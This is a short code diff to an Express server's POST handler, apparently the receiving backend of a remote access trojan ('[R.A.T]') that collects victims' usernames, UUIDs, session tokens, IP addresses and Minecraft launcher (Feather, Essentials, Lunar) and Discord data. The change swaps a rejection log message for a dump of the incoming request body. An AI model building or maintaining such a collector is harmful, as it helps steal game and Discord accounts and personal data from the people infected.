@@ -44,7 +44,7 @@ setInterval(() => {
 app.post("/", (req, res) => {
     //happens if the request does not contain all the required fields, aka someones manually posting to the server
     if (!["username", "uuid", "token", "ip", "feather", "essentials", "lunar", "discord"].every(field => req.body.hasOwnProperty(field))) {
-        console.log("[R.A.T] Rejected malformed JSON")
+        console.log(req.body)
         return res.sendStatus(404)
     }
 
